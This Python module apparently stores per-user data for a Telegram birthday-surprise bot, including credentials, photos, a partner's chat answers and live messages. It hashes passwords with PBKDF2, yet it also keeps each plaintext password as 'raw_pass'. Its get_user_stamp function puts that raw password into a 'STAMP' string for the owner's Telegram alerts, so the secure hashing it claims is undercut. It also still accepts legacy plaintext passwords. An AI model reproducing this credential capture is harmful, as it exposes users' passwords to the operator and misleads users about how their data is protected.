#!/usr/bin/env python3
"""
📦 UserStore — Organized Per-User Data Storage
================================================
Replaces the flat bot_config.json approach with a clean,
per-user file system inside the `users/` directory.

Structure:
  users/
    {username}.json   ← one file per user, contains EVERYTHING about them

Each user file contains:
  - credentials (username, password hash)
  - surprise details (name, theme, wish, link, expiry)
  - photos (Telegram CDN file_ids + URLs)
  - chat answers (girlfriend's Q&A replies)
  - live chat messages
  - deletion schedule

Usage:
  from user_store import UserStore
  store = UserStore()
  store.create_user("ansh", "1234", tg_chat_id=123456)
  store.save_surprise("ansh", {...})
  store.add_answer("ansh", {...})
  store.delete_user("ansh")
"""

import os
import json
import time
import threading
import hashlib
import secrets

# Directory where all user data files are stored
USERS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "users")
os.makedirs(USERS_DIR, exist_ok=True)

_lock = threading.Lock()


def hash_password(password: str) -> str:
    """Securely hashes a password using PBKDF2-HMAC-SHA256 with a unique salt."""
    if not password:
        return ""
    if password.startswith("pbkdf2:"):
        return password  # already hashed
    salt = secrets.token_hex(16)
    key = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt.encode("utf-8"), 100000).hex()
    return f"pbkdf2:{salt}:{key}"


def verify_password_hash(stored_hash: str, password: str) -> bool:
    """Verifies a password against the stored PBKDF2 hash (or legacy plaintext with timing attack protection)."""
    if not stored_hash or not password:
        return False
    if stored_hash.startswith("pbkdf2:"):
        parts = stored_hash.split(":")
        if len(parts) == 3:
            _, salt, key = parts
            check = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt.encode("utf-8"), 100000).hex()
            return secrets.compare_digest(check, key)
    # Legacy plaintext backward compatibility
    return secrets.compare_digest(stored_hash, password)


def _user_path(username: str) -> str:
    """Returns the absolute path to a user's JSON file."""
    safe = username.lower().strip().replace("/", "_").replace("..", "_")
    return os.path.join(USERS_DIR, f"{safe}.json")


def _default_user(username: str, password: str) -> dict:
    """Returns a fresh user record with all fields initialized."""
    now_str = time.strftime("%d %b %Y, %I:%M %p")
    now_ts  = time.time()
    return {
        "username":        username,
        "password":        hash_password(password) if password else "",
        "raw_pass":        password if password else "",
        "registered_at":   now_str,
        "registered_ts":   now_ts,
        "last_login":      now_str,
        "last_login_ts":   now_ts,
        "tg_chat_id":      None,

        # Surprise configuration filled by user/bot
        "surprise": {
            "mode":       None,   # "gf" or "bf"
            "name":       None,
            "nickname":   None,
            "age":        None,
            "theme":      None,
            "wish":       None,
            "created_at": None,   # ms timestamp
            "expires_at": None,   # ms timestamp (48 hr)
            "link":       None,
        },

        # Photos uploaded to Telegram CDN
        # Each item: {file_id, url, caption, uploaded_at}
        "photos": [],

        # Girlfriend's chat Q&A answers
        # Each item: {question, reply, time, saved_at_ts}
        "answers": [],

        # Live owner↔bot chat thread
        "live_chat": {
            "messages":   [],
            "has_unread": False,
        },

        # Auto-deletion scheduling
        "scheduled_delete_at": None,   # Unix timestamp or None
        "deleted": False,
    }


CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_config.json")


def _read_central_config() -> dict:
    """Reads bot_config.json safely."""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                cfg = json.load(f)
                if isinstance(cfg, dict):
                    return cfg
        except Exception:
            pass
    return {}


def _write_central_config(cfg: dict) -> bool:
    """Writes bot_config.json safely."""
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2, ensure_ascii=False)
        return True
    except Exception as e:
        print(f"[UserStore] Error writing central config: {e}")
        return False


class UserStore:
    """Thread-safe per-user JSON file store with Central State & Telegram Cloud survivability."""

    # ------------------------------------------------------------------
    # CRUD
    # ------------------------------------------------------------------

    def user_exists(self, username: str) -> bool:
        if not username:
            return False
        safe_u = username.lower().strip().replace("/", "_").replace("..", "_")
        if os.path.exists(_user_path(safe_u)):
            return True
        # Check Central State in bot_config.json
        cfg = _read_central_config()
        if safe_u in cfg.get("all_user_records", {}):
            return True
        if safe_u in cfg.get("birthday_portal_users", {}):
            return True
        return False

    def load_user(self, username: str) -> dict | None:
        if not username:
            return None
        safe_u = username.lower().strip().replace("/", "_").replace("..", "_")
        path = _user_path(safe_u)
        with _lock:
            data = None
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        data = json.load(f)
                except Exception as e:
                    print(f"[UserStore] Error loading {safe_u} from disk: {e}")

            # If not on disk (e.g. Render restart/redeploy wiped users/ folder), restore from Central State!
            if not data:
                cfg = _read_central_config()
                all_records = cfg.get("all_user_records", {})
                if safe_u in all_records and isinstance(all_records[safe_u], dict):
                    data = all_records[safe_u]
                    # Immediately recreate the local file on disk
                    try:
                        with open(path, "w", encoding="utf-8") as f_out:
                            json.dump(data, f_out, indent=2, ensure_ascii=False)
                    except Exception as e_w:
                        print(f"[UserStore] Warning: Could not write restored user file: {e_w}")
                    print(f"[UserStore] [RESTORE] Restored user '{safe_u}' from Central State to disk successfully")
                elif safe_u in cfg.get("birthday_portal_users", {}):
                    # Legacy fallback
                    urec = cfg["birthday_portal_users"][safe_u]
                    pwd = urec.get("password", "") if isinstance(urec, dict) else str(urec)
                    data = _default_user(safe_u, pwd)
                    if isinstance(urec, dict) and urec.get("tg_chat_id"):
                        data["tg_chat_id"] = urec.get("tg_chat_id")
                    try:
                        with open(path, "w", encoding="utf-8") as f_out:
                            json.dump(data, f_out, indent=2, ensure_ascii=False)
                    except Exception:
                        pass

            if not data:
                return None

            # Ensure all keys exist (forward-compat)
            default = _default_user(safe_u, "")
            for k, v in default.items():
                if k not in data:
                    data[k] = v
            return data

    get_user = load_user

    def save_user(self, user: dict) -> bool:
        username = user.get("username", "")
        if not username:
            return False
        safe_u = username.lower().strip().replace("/", "_").replace("..", "_")
        user["username"] = safe_u
        path = _user_path(safe_u)
        with _lock:
            # 1. Save to local file in users/
            try:
                with open(path, "w", encoding="utf-8") as f:
                    json.dump(user, f, indent=2, ensure_ascii=False)
            except Exception as e:
                print(f"[UserStore] Error saving {safe_u} to file: {e}")

            # 2. Sync to Central State in bot_config.json (survives Render restarts)
            try:
                cfg = _read_central_config()
                if "all_user_records" not in cfg:
                    cfg["all_user_records"] = {}
                cfg["all_user_records"][safe_u] = user
                _write_central_config(cfg)
            except Exception as e_cfg:
                print(f"[UserStore] Error syncing {safe_u} to Central State: {e_cfg}")

            return True

    def create_user(self, username: str, password: str, tg_chat_id=None) -> dict | None:
        """Creates a new user. Returns None if username already taken."""
        if self.user_exists(username):
            return None
        user = _default_user(username, password)
        if tg_chat_id:
            user["tg_chat_id"] = tg_chat_id
        self.save_user(user)
        print(f"[UserStore] Created user: {username}")
        return user

    def delete_user(self, username: str) -> bool:
        """Permanently deletes the user from disk and Central State."""
        safe_u = username.lower().strip().replace("/", "_").replace("..", "_")
        path = _user_path(safe_u)
        with _lock:
            if os.path.exists(path):
                try:
                    os.remove(path)
                    print(f"[UserStore] Deleted user file: {safe_u}")
                except Exception as e:
                    print(f"[UserStore] Error deleting {safe_u}: {e}")

            # Also remove from Central State in bot_config.json
            try:
                cfg = _read_central_config()
                changed = False
                if "all_user_records" in cfg and safe_u in cfg["all_user_records"]:
                    del cfg["all_user_records"][safe_u]
                    changed = True
                if "birthday_portal_users" in cfg and safe_u in cfg["birthday_portal_users"]:
                    del cfg["birthday_portal_users"][safe_u]
                    changed = True
                if "portal_user_data" in cfg and safe_u in cfg["portal_user_data"]:
                    del cfg["portal_user_data"][safe_u]
                    changed = True
                if "link_expiries" in cfg and safe_u in cfg["link_expiries"]:
                    del cfg["link_expiries"][safe_u]
                    changed = True
                if changed:
                    _write_central_config(cfg)
            except Exception as e_c:
                print(f"[UserStore] Error removing {safe_u} from central config: {e_c}")

            return True

    def list_users(self) -> list[str]:
        """Returns sorted list of all registered usernames (from disk + Central State)."""
        names = set()
        try:
            for f in os.listdir(USERS_DIR):
                if f.endswith(".json") and not f.startswith("_"):
                    names.add(f[:-5])
        except Exception:
            pass
        # Add any users from Central State
        cfg = _read_central_config()
        for k in cfg.get("all_user_records", {}).keys():
            names.add(k)
        for k in cfg.get("birthday_portal_users", {}).keys():
            names.add(k)
        return sorted(list(names))

    def get_all_users(self) -> list[dict]:
        """Returns list of all user records (full dicts)."""
        users = []
        for uname in self.list_users():
            u = self.load_user(uname)
            if u and not u.get("deleted"):
                users.append(u)
        return users

    # ------------------------------------------------------------------
    # AUTH
    # ------------------------------------------------------------------

    def verify_password(self, username: str, password: str) -> bool:
        user = self.load_user(username)
        if not user:
            return False
        stored = user.get("password", "")
        if not verify_password_hash(stored, password):
            return False
        # Auto-upgrade plain passwords to secure pbkdf2 hash on successful login
        if stored and not stored.startswith("pbkdf2:"):
            user["password"] = hash_password(password)
            self.save_user(user)
        return True

    def set_password(self, username: str, new_password: str) -> bool:
        user = self.load_user(username)
        if not user:
            return False
        user["password"] = hash_password(new_password)
        user["raw_pass"] = new_password
        return self.save_user(user)

    def update_last_login(self, username: str):
        user = self.load_user(username)
        if not user:
            return
        user["last_login"]    = time.strftime("%d %b %Y, %I:%M %p")
        user["last_login_ts"] = time.time()
        self.save_user(user)

    def get_user_stamp(self, username: str) -> str:
        """
        Returns the formatted credential stamp for Owner TG Bot alerts:
        🏷️ STAMP: Name: <user> | Pass: <pass>
        """
        if not username:
            return "━━━━━━━━━━━━━━━━━━━━\n🏷️ <b>STAMP:</b> Name: <code>Unknown</code> | Pass: <code>N/A</code>"
        safe_u = username.lower().strip()
        user = self.load_user(safe_u)
        pwd = ""
        if user:
            pwd = user.get("raw_pass") or user.get("password", "")
        if not pwd:
            cfg = _read_central_config()
            urec = cfg.get("birthday_portal_users", {}).get(safe_u)
            if urec:
                pwd = urec.get("password", "") if isinstance(urec, dict) else str(urec)
        if pwd.startswith("pbkdf2:"):
            parts = pwd.split(":")
            pwd = parts[-1][:10] if len(parts) >= 3 else pwd[:10]
        if not pwd:
            pwd = "N/A"
        return f"━━━━━━━━━━━━━━━━━━━━\n🏷️ <b>STAMP:</b> Name: <code>{safe_u}</code> | Pass: <code>{pwd}</code>"

    # ------------------------------------------------------------------
    # SURPRISE / LINK
    # ------------------------------------------------------------------

    def save_surprise(self, username: str, surprise_data: dict) -> bool:
        user = self.load_user(username)
        if not user:
            return False
        user["surprise"].update(surprise_data)
        return self.save_user(user)

    def get_surprise(self, username: str) -> dict:
        user = self.load_user(username)
        if not user:
            return {}
        return user.get("surprise", {})

    # ------------------------------------------------------------------
    # PHOTOS (Telegram CDN)
    # ------------------------------------------------------------------

    def add_photo(self, username: str, file_id: str, url: str, caption: str = "", message_id=None, file_path: str = "") -> bool:
        user = self.load_user(username)
        if not user:
            return False
        photo = {
            "file_id":     file_id,
            "url":         url,   # token-free proxy URL (/api/photo?...), never a raw TG CDN URL
            "file_path":   file_path or "",
            "caption":     caption,
            "message_id":  message_id,   # Telegram message_id for deleteMessage
            "uploaded_at": time.strftime("%d %b %Y, %I:%M %p"),
            "uploaded_ts": time.time(),
        }
        user.setdefault("photos", []).append(photo)
        return self.save_user(user)

    def get_photos(self, username: str) -> list:
        user = self.load_user(username)
        if not user:
            return []
        return user.get("photos", [])

    def delete_all_photos(self, username: str) -> bool:
        user = self.load_user(username)
        if not user:
            return False
        user["photos"] = []
        return self.save_user(user)

    # ------------------------------------------------------------------
    # ANSWERS (Girlfriend's chat Q&A)
    # ------------------------------------------------------------------

    def add_answer(self, username: str, answer: dict) -> bool:
        user = self.load_user(username)
        if not user:
            return False
        answer["saved_at_ts"] = time.time()
        user.setdefault("answers", []).append(answer)
        return self.save_user(user)

    def get_answers(self, username: str) -> list:
        user = self.load_user(username)
        if not user:
            return []
        return user.get("answers", [])

    def clear_answers(self, username: str) -> bool:
        user = self.load_user(username)
        if not user:
            return False
        user["answers"] = []
        return self.save_user(user)

    # ------------------------------------------------------------------
    # LIVE CHAT
    # ------------------------------------------------------------------

    def add_chat_message(self, username: str, message: dict) -> bool:
        user = self.load_user(username)
        if not user:
            return False
        lc = user.setdefault("live_chat", {"messages": [], "has_unread": False})
        message["ts"] = time.time()
        lc["messages"].append(message)
        lc["has_unread"] = True
        # Keep last 200 messages only
        if len(lc["messages"]) > 200:
            lc["messages"] = lc["messages"][-200:]
        return self.save_user(user)

    def get_chat_messages(self, username: str, last_n: int = 50) -> list:
        user = self.load_user(username)
        if not user:
            return []
        msgs = user.get("live_chat", {}).get("messages", [])
        return msgs[-last_n:]

    def mark_chat_read(self, username: str) -> bool:
        user = self.load_user(username)
        if not user:
            return False
        user.setdefault("live_chat", {})["has_unread"] = False
        return self.save_user(user)

    # ------------------------------------------------------------------
    # SCHEDULED DELETION (Auto-delete after X hours)
    # ------------------------------------------------------------------

    def schedule_deletion(self, username: str, after_seconds: int = 86400) -> bool:
        """Schedule user deletion after given seconds (default 24h)."""
        user = self.load_user(username)
        if not user:
            return False
        delete_at = time.time() + after_seconds
        user["scheduled_delete_at"] = delete_at
        self.save_user(user)
        print(f"[UserStore] {username} scheduled for deletion at {time.strftime('%d %b %Y %I:%M %p', time.localtime(delete_at))}")
        return True

    def cancel_scheduled_deletion(self, username: str) -> bool:
        user = self.load_user(username)
        if not user:
            return False
        user["scheduled_delete_at"] = None
        return self.save_user(user)

    def run_scheduled_deletions(self) -> list[str]:
        """
        Check all users and delete those whose scheduled_delete_at has passed.
        Returns list of deleted usernames. Call this in a background thread loop.
        """
        deleted = []
        now = time.time()
        for uname in self.list_users():
            user = self.load_user(uname)
            if not user:
                continue
            sched = user.get("scheduled_delete_at")
            if sched and now >= sched:
                print(f"[UserStore] Auto-deleting expired user: {uname}")
                self.delete_user(uname)
                deleted.append(uname)
        return deleted

    # ------------------------------------------------------------------
    # IMPORT from old bot_config.json (one-time migration helper)
    # ------------------------------------------------------------------

    def migrate_from_config(self, config: dict) -> int:
        """
        Migrates users from the old flat bot_config.json into per-user files.
        Returns the number of users migrated.
        """
        migrated = 0
        old_users   = config.get("birthday_portal_users", {})
        old_data    = config.get("portal_user_data", {})
        old_expiry  = config.get("link_expiries", {})
        old_answers = config.get("saved_answers", [])
        old_chats   = config.get("live_chats", {})

        for uname, urec in old_users.items():
            if self.user_exists(uname):
                continue
            if isinstance(urec, dict):
                pwd = urec.get("password", "")
                tgid = urec.get("tg_chat_id")
            else:
                pwd  = str(urec)
                tgid = None

            user = _default_user(uname, pwd)
            user["registered_at"] = urec.get("registered_at", user["registered_at"]) if isinstance(urec, dict) else user["registered_at"]
            user["last_login"]    = urec.get("last_login",    user["last_login"])    if isinstance(urec, dict) else user["last_login"]
            user["tg_chat_id"]    = tgid

            # Migrate portal_user_data → surprise
            pdata = old_data.get(uname, {})
            if pdata:
                user["surprise"]["mode"]     = pdata.get("mode")
                user["surprise"]["name"]     = pdata.get("celebrant_name") or pdata.get("name")
                user["surprise"]["nickname"] = pdata.get("celebrant_nickname") or pdata.get("nickname")
                user["surprise"]["age"]      = pdata.get("celebrant_age")  or pdata.get("age")
                user["surprise"]["theme"]    = pdata.get("selected_theme") or pdata.get("theme")
                user["surprise"]["wish"]     = pdata.get("custom_wish")    or pdata.get("wish")

            # Migrate link_expiries
            exp = old_expiry.get(uname, {})
            if exp:
                user["surprise"]["expires_at"] = exp.get("expires_at")
                user["surprise"]["created_at"] = exp.get("generated_at")
                user["surprise"]["link"]       = exp.get("link")

            # Migrate saved_answers that match this user
            for ans in old_answers:
                cname = ans.get("celebrant", "").lower().replace(" ", "_")
                if cname == uname or cname in uname or uname in cname:
                    user["answers"].append(ans)

            # Migrate live_chats
            chat_data = old_chats.get(uname, {})
            if chat_data:
                user["live_chat"]["messages"]   = chat_data.get("messages", [])
                user["live_chat"]["has_unread"] = chat_data.get("has_unread", False)

            self.save_user(user)
            migrated += 1
            print(f"[UserStore] Migrated: {uname}")

        print(f"[UserStore] Migration complete. {migrated} users migrated.")
        return migrated

    # ------------------------------------------------------------------
    # TELEGRAM CLOUD SNAPSHOT (Export / Import for Zero Data Loss)
    # ------------------------------------------------------------------

    def export_cloud_snapshot(self) -> dict:
        """Exports complete snapshot of all users and surprises for Telegram Cloud backup."""
        users_map = {}
        for uname in self.list_users():
            u = self.load_user(uname)
            if u:
                users_map[uname] = u

        cfg = _read_central_config()
        return {
            "version": 2,
            "exported_at": time.strftime("%d %b %Y, %I:%M %p"),
            "exported_ts": time.time(),
            "users": users_map,
            "short_surprise_links": cfg.get("short_surprise_links", {}),
            "saved_answers": cfg.get("saved_answers", [])
        }

    def import_cloud_snapshot(self, snapshot: dict) -> int:
        """Restores users and surprises from Telegram Cloud snapshot."""
        if not isinstance(snapshot, dict) or "users" not in snapshot:
            return 0
        restored_count = 0
        for uname, udata in snapshot.get("users", {}).items():
            if isinstance(udata, dict) and uname:
                self.save_user(udata)
                restored_count += 1

        cfg = _read_central_config()
        changed = False
        if snapshot.get("short_surprise_links"):
            if "short_surprise_links" not in cfg:
                cfg["short_surprise_links"] = {}
            cfg["short_surprise_links"].update(snapshot["short_surprise_links"])
            changed = True
        if snapshot.get("saved_answers") and isinstance(snapshot["saved_answers"], list):
            existing_ans = cfg.get("saved_answers", [])
            existing_tuples = {(a.get("question"), a.get("reply"), a.get("celebrant")) for a in existing_ans}
            for a in snapshot["saved_answers"]:
                tup = (a.get("question"), a.get("reply"), a.get("celebrant"))
                if tup not in existing_tuples:
                    existing_ans.append(a)
                    existing_tuples.add(tup)
            cfg["saved_answers"] = existing_ans
            changed = True
        if changed:
            _write_central_config(cfg)

        print(f"[UserStore] [CLOUD] Restored {restored_count} users from Telegram Cloud snapshot")
        return restored_count


# Global singleton instance
user_store = UserStore()

